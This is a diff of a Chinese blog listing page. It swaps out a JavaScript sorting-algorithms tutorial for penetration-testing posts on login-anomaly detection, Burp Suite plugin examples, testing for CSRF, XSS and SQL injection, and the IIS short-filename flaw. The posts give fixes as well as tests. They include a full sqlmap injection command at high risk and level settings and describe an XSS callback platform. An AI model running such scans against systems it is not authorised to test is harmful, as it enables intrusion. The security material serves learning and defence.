-    return merge(mergeSort(left), mergeSort(right));
-}
- 
-function merge(left, right) {
-    var result = [];
- 
-    while (left.length&gt;0 &amp;&amp; right.length&gt;0) {
-        if (left[0] &lt;= right[0]) {
-            result.push(left.shift());
-        } else {
-            result.push(right.shift());
-        }
-    }
- 
-    while (left.length)
-        result.push(left.shift());
- 
-    while (right.length)
-        result.push(right.shift());
- 
-    return result;
-}
-</code></pre>
-
-<h3 id="toc_26">5.4 算法分析</h3>
-
-<p>归并排序是一种稳定的排序方法。和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是O(nlogn）的时间复杂度。代价是需要额外的内存空间。</p>
-
-<h2 id="toc_27">6、快速排序（Quick Sort）</h2>
-
-<p>快速排序的基本思想：通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。</p>
-
-<h3 id="toc_28">6.1 算法描述</h3>
-
-<p>快速排序使用分治法来把一个串（list）分为两个子串（sub-lists）。具体算法描述如下：</p>
-
-<p>从数列中挑出一个元素，称为 “基准”（pivot）；<br/>
-重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作；<br/>
-递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。</p>
-
-<h3 id="toc_29">6.2 动图演示</h3>
-<img src="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015230936371-1413523412.gif" alt="" width="682" height="212">
-<h3 id="toc_30">6.3 代码实现</h3>
-
-<pre class="line-numbers"><code class="language-text">function quickSort(arr, left, right) {
-    var len = arr.length,
-        partitionIndex,
-        left = typeof left != &#39;number&#39; ? 0 : left,
-        right = typeof right != &#39;number&#39; ? len - 1 : right;
- 
-    if (left &lt; right) {
-        partitionIndex = partition(arr, left, right);
-        quickSort(arr, left, partitionIndex-1);
-        quickSort(arr, partitionIndex+1, right);
-    }
-    return arr;
-}
- 
-function partition(arr, left ,right) {     // 分区操作
-    var pivot = left,                      // 设定基准值（pivot）
-        index = pivot + 1;
-    for (var i = index; i &lt;= right; i++) {
-        if (arr[i] &lt; arr[pivot]) {
-            swap(arr, i, index);
-            index++;
-        }       
-    }
-    swap(arr, pivot, index - 1);
-    return index-1;
-}
- 
-function swap(arr, i, j) {
-    var temp = arr[i];
-    arr[i] = arr[j];
-    arr[j] = temp;
-}
-</code></pre>
-
-<h2 id="toc_31">7、堆排序（Heap Sort）</h2>
-
-<p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。</p>
-
-<h3 id="toc_32">7.1 算法描述</h3>
-
-<p>将初始待排序关键字序列(R1,R2….Rn)构建成大顶堆，此堆为初始的无序区；<br/>
-将堆顶元素R[1]与最后一个元素R[n]交换，此时得到新的无序区(R1,R2,……Rn-1)和新的有序区(Rn),且满足R[1,2…n-1]&lt;=R[n]；<br/>
-由于交换后新的堆顶R[1]可能违反堆的性质，因此需要对当前无序区(R1,R2,……Rn-1)调整为新堆，然后再次将R[1]与无序区最后一个元素交换，得到新的无序区(R1,R2….Rn-2)和新的有序区(Rn-1,Rn)。不断重复此过程直到有序区的元素个数为n-1，则整个排序过程完成。</p>
-
-<h3 id="toc_33">7.2 动图演示</h3>
-<img src="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015231308699-356134237.gif" alt="">
-<h3 id="toc_34">7.3 代码实现</h3>
-
-<pre class="line-numbers"><code class="language-text">var len;    // 因为声明的多个函数都需要数据长度，所以把len设置成为全局变量
- 
-function buildMaxHeap(arr) {   // 建立大顶堆
-    len = arr.length;
-    for (var i = Math.floor(len/2); i &gt;= 0; i--) {
-        heapify(arr, i);
-    }
-}
- 
-function heapify(arr, i) {     // 堆调整
-    var left = 2 * i + 1,
-        right = 2 * i + 2,
-        largest = i;
- 
-    if (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) {
-        largest = left;
-    }
- 
-    if (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) {
-        largest = right;
-    }
- 
-    if (largest != i) {
-        swap(arr, i, largest);
-        heapify(arr, largest);
-    }
-}
- 
-function swap(arr, i, j) {
-    var temp = arr[i];
-    arr[i] = arr[j];
-    arr[j] = temp;
-}
- 
-function heapSort(arr) {
-    buildMaxHeap(arr);
- 
-    for (var i = arr.length - 1; i &gt; 0; i--) {
-        swap(arr, 0, i);
-        len--;
-        heapify(arr, 0);
-    }
-    return arr;
-}
-</code></pre>
-
-<h2 id="toc_35">8、计数排序（Counting Sort）</h2>
-
-<p>计数排序不是基于比较的排序算法，其核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。 作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p>
-
-<h3 id="toc_36">8.1 算法描述</h3>
-
-<p>找出待排序的数组中最大和最小的元素；<br/>
-统计数组中每个值为i的元素出现的次数，存入数组C的第i项；<br/>
-对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）；<br/>
-反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1。</p>
-
-<h3 id="toc_37">8.2 动图演示</h3>
-<img src="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015231740840-6968181.gif" alt="" width="690" height="380">
-<h3 id="toc_38">8.3 代码实现</h3>
-
-<pre class="line-numbers"><code class="language-text">function countingSort(arr, maxValue) {
-    var bucket = new Array(maxValue + 1),
-        sortedIndex = 0;
-        arrLen = arr.length,
-        bucketLen = maxValue + 1;
- 
-    for (var i = 0; i &lt; arrLen; i++) {
-        if (!bucket[arr[i]]) {
-            bucket[arr[i]] = 0;
-        }
-        bucket[arr[i]]++;
-    }
- 
-    for (var j = 0; j &lt; bucketLen; j++) {
-        while(bucket[j] &gt; 0) {
-            arr[sortedIndex++] = j;
-            bucket[j]--;
-        }
-    }
- 
-    return arr;
-}
-</code></pre>
-
-<h3 id="toc_39">8.4 算法分析</h3>
-
-<p>计数排序是一个稳定的排序算法。当输入的元素是 n 个 0到 k 之间的整数时，时间复杂度是O(n+k)，空间复杂度也是O(n+k)，其排序速度快于任何比较排序算法。当k不是很大并且序列比较集中时，计数排序是一个很有效的排序算法。</p>
-
-<h2 id="toc_40">9、桶排序（Bucket Sort）</h2>
-
-<p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。桶排序 (Bucket sort)的工作的原理：假设输入数据服从均匀分布，将数据分到有限数量的桶里，每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排）。</p>
-
-<h3 id="toc_41">9.1 算法描述</h3>
-
-<p>设置一个定量的数组当作空桶；<br/>
-遍历输入数据，并且把数据一个一个放到对应的桶里去；<br/>
-对每个不是空的桶进行排序；<br/>
-从不是空的桶里把排好序的数据拼接起来。 </p>
-
-<h3 id="toc_42">9.2 图片演示</h3>
-
-<p><figure><img src="media/15474694746707/15474703458460.jpg" alt=""/></figure></p>
-
-<h3 id="toc_43">9.3 代码实现</h3>
-
-<pre class="line-numbers"><code class="language-text">function bucketSort(arr, bucketSize) {
-    if (arr.length === 0) {
-      return arr;
-    }
- 
-    var i;
-    var minValue = arr[0];
-    var maxValue = arr[0];
-    for (i = 1; i &lt; arr.length; i++) {
-      if (arr[i] &lt; minValue) {
-          minValue = arr[i];                // 输入数据的最小值
-      } else if (arr[i] &gt; maxValue) {
-          maxValue = arr[i];                // 输入数据的最大值
-      }
-    }
- 
-    // 桶的初始化
-    var DEFAULT_BUCKET_SIZE = 5;            // 设置桶的默认数量为5
-    bucketSize = bucketSize || DEFAULT_BUCKET_SIZE;
-    var bucketCount = Math.floor((maxValue - minValue) / bucketSize) + 1;  
-    var buckets = new Array(bucketCount);
-    for (i = 0; i &lt; buckets.length; i++) {
-        buckets[i] = [];
-    }
- 
-    // 利用映射函数将数据分配到各个桶中
-    for (i = 0; i &lt; arr.length; i++) {
-        buckets[Math.floor((arr[i] - minValue) / bucketSize)].push(arr[i]);
-    }
- 
-    arr.length = 0;
-    for (i = 0; i &lt; buckets.length; i++) {
-        insertionSort(buckets[i]);                      // 对每个桶进行排序，这里使用了插入排序
-        for (var j = 0; j &lt; buckets[i].length; j++) {
-            arr.push(buckets[i][j]);                     
-        }
-    }
- 
-    return arr;
-}
-</code></pre>
-
-<h3 id="toc_44">9.4 算法分析</h3>
-
-<p>桶排序最好情况下使用线性时间O(n)，桶排序的时间复杂度，取决与对各个桶之间数据进行排序的时间复杂度，因为其它部分的时间复杂度都为O(n)。很显然，桶划分的越小，各个桶之间的数据越少，排序所用的时间也会越少。但相应的空间消耗就会增大。 </p>
-
-<h2 id="toc_45">10、基数排序（Radix Sort）</h2>
-
-<p>基数排序是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。</p>
-
-<h3 id="toc_46">10.1 算法描述</h3>
-
-<p>取得数组中的最大数，并取得位数；<br/>
-arr为原始数组，从最低位开始取每个位组成radix数组；<br/>
-对radix进行计数排序（利用计数排序适用于小范围数的特点）；<br/>
-10.2 动图演示</p>
-<img src="https://images2017.cnblogs.com/blog/849589/201710/849589-20171015232453668-1397662527.gif" alt="" width="686" height="389">
-<h3 id="toc_47">10.3 代码实现</h3>
-
-<pre class="line-numbers"><code class="language-text">// LSD Radix Sort
-var counter = [];
-function radixSort(arr, maxDigit) {
-    var mod = 10;
-    var dev = 1;
-    for (var i = 0; i &lt; maxDigit; i++, dev *= 10, mod *= 10) {
-        for(var j = 0; j &lt; arr.length; j++) {
-            var bucket = parseInt((arr[j] % mod) / dev);
-            if(counter[bucket]==null) {
-                counter[bucket] = [];
-            }
-            counter[bucket].push(arr[j]);
-        }
-        var pos = 0;
-        for(var j = 0; j &lt; counter.length; j++) {
-            var value = null;
-            if(counter[j]!=null) {
-                while ((value = counter[j].shift()) != null) {
-                      arr[pos++] = value;
-                }
-          }
-        }
-    }
-    return arr;
-}
-</code></pre>
-
-<h3 id="toc_48">10.4 算法分析</h3>
-
-<p>基数排序基于分别排序，分别收集，所以是稳定的。但基数排序的性能比桶排序要略差，每一次关键字的桶分配都需要O(n)的时间复杂度，而且分配之后得到新的关键字序列又需要O(n)的时间复杂度。假如待排数据可以分为d个关键字，则基数排序的时间复杂度将是O(d*2n) ，当然d要远远小于n，因此基本上还是线性级别的。</p>
-
-<p>基数排序的空间复杂度为O(n+k)，其中k为桶的数量。一般来说n&gt;&gt;k，因此额外空间需要大概n个左右。</p>
 
                         
                       </div>
@@ -713,10 +521,605 @@ function radixSort(arr, maxDigit) {
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/1/14 20:37 下午</span>
+                    <span class="date">2018/12/13 15:54 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='%E5%BC%80%E5%8F%91.html'>开发</a></span>
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446875268619.html">
+                
+                  <h1>异常登录检测</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>异常登录功能用来检测服务器上的登录行为。<br/>
+非常用地的登录行为告警（这个常用登陆地可以作为个人信息的一部分来由用户设置；或者收集第一次成功登录时的公网ip，然后将此ip地址设置位常用登陆地，从该时间往后顺延24小时内的所有公网登录地也会被记为常用登陆地，当超过24小时候，所有不在常用登陆地的登录行为均视为异地登录警告。当某个ip被判定为异地登录时，仅第一次登录行为进行告警，如果成功登录6次或以上，则默认将此ip的地点记录为常用登录地。）<br/>
+非常用登录ip告警<br/>
+非常用登录时间告警<br/>
+非常用登录账号告警（同一时间段内超多次登录同一账号、同一时间段内不同地理位置登录账号、同一时间段内多个ip登录同一账号、不同设备登录同一账号、同一设备不同ip登录同一账号）</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 15:52 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446874145620.html">
+                
+                  <h1>burpsuite插件编写之官方代码示例解读</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>description: 分析burpsuite官方提供的示例代码，以此来学习插件编写。</p>
+</blockquote>
+
+<h2 id="toc_0">HelloWorld</h2>
+
+<p>废话不多说，直接上代码！</p>
+
+<pre class="line-numbers"><code class="language-python">from burp import IBurpExtender
+from java.io import PrintWriter
+from java.lang import RuntimeException
+
+# 上面import的第一句是所有burp插件都必须有的
+# 下面开始创建一个burp插件的类来实现插件
+class BurpExtender(IBurpExtender):
+    def registerExtenderCallbacks(self, callbacks):
+        # 创建插件名
+        callbacks.setExtensionName(&quot;HelloWorld extension&quot;)
+        # 获取输出和错误流
+        stdout = PrintWriter(callbacks.getStdout(), True)
+        stderr = PrintWriter(callbacks.getStderr(), True)
+        # 在输出流和错误流中插入消息
+        stdout.println(&quot;Hello output&quot;)
+        stderr.println(&quot;Hello errors&quot;)
+        # 将消息插入burp的alert警报标签中
+        callbacks.issueAlert(&quot;Hello alerts&quot;)
+        # 抛出将出现在错误流中的异常
+        raise RuntimeException(&quot;Hello exception&quot;)
+</code></pre>
+
+<p>现在开始来说几个坑：<br/>
+1、插件最好尽量放在英文路径，不然可能会报错<br/>
+2、编写代码前指定编码(如：# -<em>- coding:utf8 -</em>-)<br/>
+3、raise RuntimeException(&quot;Hello exception&quot;) 这行代码我没看懂是要干嘛的，反正写了之后Errors就报错，不想看的话就注释掉好了。</p>
+
+<h2 id="toc_1">event_listeners 事件监听器</h2>
+
+<pre class="line-numbers"><code class="language-python">#!/usr/bin/python3
+# -*- coding:utf-8 -*-
+
+from burp import IBurpExtender
+from burp import IHttpListener
+from burp import IProxyListener
+from burp import IScannerListener
+from burp import IExtensionStateListener
+from java.io import PrintWriter
+
+class BurpExtender(IBurpExtender, IHttpListener, IProxyListener, IScannerListener, IExtensionStateListener):
+    def registerExtenderCallbacks(self, callbacks):
+        # 保持对回调对象的引用
+        self._callbacks = callbacks
+        # 创建插件名
+        callbacks.setExtensionName(&quot;Event Listeners&quot;)
+        # 获取输出流
+        self._stdout = PrintWriter(callbacks.getStdout(), True)
+        # 注册为http监听器
+        callbacks.registerHttpListener(self)
+        # 注册为proxy监听器
+        callbacks.registerProxyListener(self)
+        # 注册为scanner监听器
+        callbacks.registerScannerListener(self)
+        # 注册为扩展插件状态监听器
+        callbacks.registerExtensionStateListener(self)
+    # 下面几个函数各自实现监听
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        self._stdout.println(
+            (&quot;HTTP request to &quot; if messageIsRequest else &quot;HTTP response from&quot;) +
+            messageInfo.getHttpService().toString() +
+            &quot;[&quot; + self._callbacks.getToolName(toolFlag) + &quot;]&quot;
+        )
+
+    def processProxyMessage(self, messageIsRequest, message):
+        self._stdout.println(
+            (&quot;Proxy request to &quot; if messageIsRequest else &quot;Proxy response from&quot;) +
+            message.getMessageInfo.getHTTPService().toString()
+        )
+
+    def newScanIssue(self, issue):
+        self._stdout.prinln(&quot;New scan issue &quot; + issue.getIssueName())
+
+    def extensionUnloaded(self):
+        self._stdout.println(&quot;Extension was unloaded&quot;)
+</code></pre>
+
+<p>我是没搞懂这个插件做了什么，诶无所谓，也就是多敲敲代码，熟悉熟悉感觉。</p>
+
+<h2 id="toc_2">traffic_redirector 流量重定向</h2>
+
+<pre class="line-numbers"><code class="language-python">#!/usr/bin/python3
+# -*- coding:utf-8 -*-
+
+from burp import IBurpExtender
+from burp import IHttpListener
+
+HOST_FROM = &quot;www.baidu.com&quot;
+HOST_TO = &quot;www.zhihu.com&quot;
+
+class BurpExtender(IBurpExtender, IHttpListener):
+    def registerExtenderCallbacks(self, callbacks):
+        # 获取扩展helpers对象
+        self._helpers = callbacks.getHelpers()
+        # 设置扩展名
+        callbacks.setExtensionName(&quot;Traffic redirector&quot;)
+        # 将自己注册为HTTP侦听器
+        callbacks.registerHttpListener(self)
+
+    def processHttpMessage(self, toolsFlag, messageIsRequest, messageInfo):
+        # 只获取请求
+        if not messageIsRequest:
+            return
+        # 获取http服务的请求
+        httpService = messageInfo.getHttpService()
+        # 如果主机是HOST_FROM则将它改成HOST_TO
+        if (HOST_FROM == httpService.getHost()):
+            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,
+                httpService.getPort(), httpService.getProtocol()))
+</code></pre>
+
+<p>这个插件简单来说就是，把请求中的host部分修改掉。比如上述代码会监听所有host为百度的请求，一旦出现，就会把host改成知乎。</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 15:50 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446869314706.html">
+                
+                  <h1>xss、csrf、sql注入快速检测方法</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<h2 id="toc_0">CSRF跨站请求伪造</h2>
+
+<ul>
+<li>原理<br/>
+攻击者在受害者不知情的情况下，以受害者的名义伪造请求发送给受攻击的站点，从而在未授权的情况下执行在权限保护之下的操作。<br/>
+CSRF攻击的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。<br/></li>
+</ul>
+
+<hr/>
+
+<ul>
+<li>检测方法<br/>
+1.查看重要操作接口提交的请求中是否包含 csrf_token<br/>
+2.更改和删除 csrf_token 后提交表单，查看请求是否能被正确响应。<br/></li>
+</ul>
+
+<hr/>
+
+<ul>
+<li>修复方案<br/>
+1.对涉及数据<strong>增、删、改</strong>操作提交的表单中添加csrf_token，token 参数应校验一次后失效。<br/>
+2.最好是在容器或框架上<strong>全局</strong>启用 csrf_token。(很多框架自带的解决办法容易遗漏一次失效的问题)<br/>
+3.token 应有一定的<strong>时效性</strong>，建议为30分钟，过期需失效（即：单页面停留30分钟后，用户提交请求需提示“页面过期，请刷新页面后再次提交”）<br/></li>
+</ul>
+
+<hr/>
+
+<ul>
+<li>参考<br/>
+<a href="https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005)">CSRF测试</a><br/>
+<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">跨站请求伪造（CSRF）</a><br/>
+<a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/">CSRF 攻击的应对之道</a><br/>
+## XSS跨站脚本攻击<br/>
+### 反射型</li>
+<li>原理<br/></li>
+</ul>
+
+<hr/>
+
+<ul>
+<li>检测方法<br/>
+<strong>检测场景</strong>：任何有输入输出地方......<br/>
+1.使用通用的web扫描器一般的都能发掘潜在的反射型XSS漏洞。<br/>
+2.手工在一些输入框中或者post参数中加入拼凑过的JS代码，根据返回的页面源码中是否成功嵌入JS代码来判断XSS是否存在。<br/>
+3.如果注入的代码经过后端处理后，永久性的嵌入到了页面当中，则该XSS为存储型的，反射型的XSS一般依赖于该次请求，且同时只能被用户自己所看到。<br/></li>
+</ul>
+
+<hr/>
+
+<ul>
+<li>修复方案<br/>
+1.输出时统一使用 htmlEscape（）转义用户输入的数据，将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。<br/>
+2.如果存在用户编写文章等类似用户可以自定义页面样式的功能，则限制用户输入，采用严格的白名单来过滤用户的输入，这种过滤应在后端应实现。(很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤)。<br/></li>
+</ul>
+
+<hr/>
+
+<h3 id="toc_1">存储型</h3>
+
+<ul>
+<li>原理<br/></li>
+</ul>
+
+<hr/>
+
+<ul>
+<li>检测方法<br/>
+<strong>检测场景</strong>：存在富文本编辑器的地方；用户的输入信息会作为固定的值回显到页面中；后台管理应用中维护用户输入的相关信息。<br/>
+1.手工在一些输入框中或者post参数中加入污染的JS代码，根据返回的页面源码中是否成功嵌入JS代码来判断XSS是否存在(注入前端转义的情况)。<br/>
+2.如果注入的代码经过后端处理后，永久性的嵌入到了页面当中，则该XSS为存储型的。<br/>
+3.如果尝试注入的代码在页面中均被html编码，则再考虑其数据的流转会不会在后台其他应用中处理这些输入数据，如果有，对应的后台应用是否也做了完善的过滤机制。<br/>
+4.可远程搭建XSS检测平台，如果有XSS测试代码被触发，则自动发起链接到该平台上，这样相对来说可以测试那些未知的数据流向是否造成问题。<br/></li>
+</ul>
+
+<hr/>
+
+<ul>
+<li>修复方案<br/>
+1.输出时统一使用 htmlEscape（）转义用户输入的数据，将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。<br/>
+2.如果存在用户编写文章等类似用户可以自定义页面样式的功能，则限制用户输入，采用严格的白名单来过滤用户的输入，这种过滤应在后端应实现。(很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤)。<br/></li>
+</ul>
+
+<hr/>
+
+<h3 id="toc_2">基于DOM型</h3>
+
+<ul>
+<li>原理<br/></li>
+</ul>
+
+<hr/>
+
+<p>没啥可说的，可以当成是特殊的反射型。</p>
+
+<ul>
+<li>检测方法<br/></li>
+</ul>
+
+<hr/>
+
+<ul>
+<li>修复方案<br/></li>
+</ul>
+
+<hr/>
+
+<ul>
+<li>参考<br/>
+<a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS跨站脚本</a>
+## SQL_Inject<br/></li>
+<li>原理<br/></li>
+</ul>
+
+<hr/>
+
+<p>开发人员使用直接拼接 sql 的方法来访问数据库，导致攻击者能通过特殊构造的语句控制代码逻辑。典型的代码与数据没有分离导致的安全问题之一。</p>
+
+<ul>
+<li>检测方法<br/></li>
+</ul>
+
+<hr/>
+
+<ul>
+<li>常规方法<br/>
+<code>
+1 ，新建一个1 .txt文件，burp抓包将包含关键参数的请求存入。<br/>
+2 ，使用sqlmap 进行扫描（python sqlmap [options] [file path]）<br/>
+3、等待结果输出
+</code></li>
+<li>另一种常规方法<br/>
+<code>
+使用burp插件SQLiPy<br/>
+方案一（通用）：将sqlapi地址配置成 192.168.2.22 2222<br/>
+方案二：使用sqlipy生成测试语句，然后添加 -p 参数，指定注入参数，然后在 shell 里面运行 sqlmap。<br/>
+一个指定参数的SqlMap示例语句：    <br/>
+sqlmap -u “ http://xxxxxx.com:80/x/xx?x_id=1507 ” --method = “GET”-- cookie = “SESSIONID = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;<br/>
+--user-agent= &quot;Mozilla / 5.0（X11; Linux_x86_64; RV：60.0）/ 20100101火狐/ 60.0&quot;  --delay=0 --timeout=30 --retries=0 --dbms=&quot;MySQL&quot;  --os=Linux   <br/>
+--level=3 --risk=3 --threads=2 --time-sec=10 -b --batch --answers=&quot;crack=N,dict = N&quot;  -p &quot;zone_id&quot; --tables           
+</code>
+我们在跑注入的时候需要重点设置的参数：<br/>
+-risk=3<br/>
+-level=3<br/>
+--threads=2<br/>
+--dbms和–os去问开发或者测试<br/>
+-p 指定阐述减少服务器压力</li>
+<li>不太常规的方法<br/>
+1、写一个web界面调用sqlmapapi<br/>
+2、直接找开发拉代码过来进行审计</li>
+<li>修复方案<br/></li>
+</ul>
+
+<hr/>
+
+<p>1、使用安全的API ，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM 或实体框架(通常开发框架里会自带访问sql的方法来预防注入)。<br/><br/>
+2、做参数绑定，预编译查询。</p>
+
+<ul>
+<li>参考<br/>
+<a href="https://www.owasp.org/index.php/SQL_Injection">SQL注入</a></li>
+</ul>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 15:42 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446866501207.html">
+                
+                  <h1>IIS短文件名漏洞</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<h2 id="toc_0">漏洞原理</h2>
+
+<hr/>
+
+<p>windows在创建一个新文件时，操作系统还会生成 8.3 格式的兼容 MS-DOS 的（短）文件名，以允许基于 MS-DOS 或16位 windows 的程序访问这些文件。    </p>
+
+<h2 id="toc_1">利用场景</h2>
+
+<hr/>
+
+<p>1、用于猜解文件/文件名<br/><br/>
+2、.Net Framework 的拒绝服务攻击（不常见）</p>
+
+<h2 id="toc_2">检测方法</h2>
+
+<hr/>
+
+<p><strong>黑盒测试</strong><br/><br/>
+使用<a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS短文件名扫描器</a><br/><br/>
+<strong>白盒测试</strong><br/>
+几乎所有的 windows 操作系统，在 cmd 中使用命令：</p>
+
+<pre class="line-numbers"><code class="language-bat">dir /x
+</code></pre>
+
+<p>如图：<br/>
+<figure><img src="media/15446866501207/%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%BE%E7%A4%BA.png" alt="短文件名显示"/><figcaption>短文件名显示</figcaption></figure></p>
+
+<h2 id="toc_3">修复方案</h2>
+
+<hr/>
+
+<p>1、升级 .net framework 至 4.0 版本或以上<br/><br/>
+2、修改注册表键值<br/><br/>
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem 修改NtfsDisable8dot3NameCreation为1。（此项默认为0）<br/><br/>
+此设置用于禁用短文件名功能，重启后生效。<br/><br/>
+或者通过 CMD 命令：    </p>
+
+<pre class="line-numbers"><code class="language-txt">Windows Server 2008 R2
+查询是否开启短文件名功能：fsutil 8dot3name query
+关闭该功能：fsutil 8dot3name set 1
+
+Windows Server 2003
+关闭该功能：fsutil behavior set disable8dot3 1
+</code></pre>
+
+<p>以上操作只能防止新创建的文件/文件名不会出现短文件名，而当前文件/文件名依然保持短文件名。完整解决方案还需要如下操作：<br/><br/>
+3、<br/><br/>
+　　a、从当前目录中创建一个副本,并将其重命名为 tempNew；<br/><br/>
+　　b、将当前目录重命名为“tempOld”；<br/><br/>
+　　c、将“tempNew”重命名为原来的目录名。<br/><br/>
+4、禁止 url 中使用 “~” 或它的 Unicode 编码。（IIS7.0的请求阻塞不能完全阻止“~”波浪号。）</p>
+
+<hr/>
+
+<hr/>
+
+<hr/>
+
+<h2 id="toc_4">背景知识</h2>
+
+<hr/>
+
+<p>windows 支持的长文件名最多为 255 个字符。windows 还以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位 windows 的程序访问这些文件。<br/><br/>
+8.3格式短文件名规范中：<br/><br/>
+‘8’是指文件名或目录名的主体部分小于等于 8 个字节；‘3’是指文件名的扩展名部分小于等于 3 个字节。<br/><br/>
+windows 会按以下方式从长文件名生成短文件名：<br/><br/>
+windows 首先会删除文件名中的任何无效字符和空格。无效字符包括：</p>
+
+<pre class="line-numbers"><code class="language-txt">.&quot;/\[]:;=,
+</code></pre>
+
+<p>由于短文件名只能包含一个英文句点（.），因此 windows 将删除文件名中的其他英文句点，即使文件名中最后一个英文句点后面是有效的非空格字符也是如此。例如：windows 从长文件名 This is a really long filename.123.456.789.txt 生成短文件名 Thisis~1.txt 否则，windows 将忽略最后一个英文句点，而使用倒数第二个英文句点。例如：windows从长文件名 This is a really long filename.123.456.789. 生成短文件名 Thisis~1.789。<br/><br/>
+生成短文件名若需要复制的话，windows 将文件名截断为 6 个字符，并在后边附加一个波形符号（~）和一个数字（创建的每一个以 ~1 结尾的唯一文件名，复制文件以 ~2、~3等结尾。）    </p>
+
+<h2 id="toc_5">影响范围</h2>
+
+<hr/>
+
+<p>Windows 10 Pro released in July 2015Windows 10 Enterprise released in July 2015Microsoft Windows Server 2003 Standard EditionMicrosoft Windows Server 2003 Enterprise EditionMicrosoft Windows Server 2003 Datacenter EditionMicrosoft Windows Server 2003 Web EditionMicrosoft Windows Server 2003, Enterprise x64 EditionMicrosoft Windows Small Business Server 2003 Standard EditionMicrosoft Windows Small Business Server 2003 Premium EditionMicrosoft Windows XP Home EditionMicrosoft Windows XP Professional EditionMicrosoft Windows Datacenter Server Limited EditionMicrosoft Windows Advanced Server, Limited EditionMicrosoft Windows 2000 ServerMicrosoft Windows 2000 Advanced ServerMicrosoft Windows 2000 Professional EditionMicrosoft Windows NT Workstation 3.5Microsoft Windows NT Workstation 3.51Microsoft Windows NT Workstation 4.0 开发员版Microsoft Windows NT Server 3.51Microsoft Windows NT Server 4.0 Standard 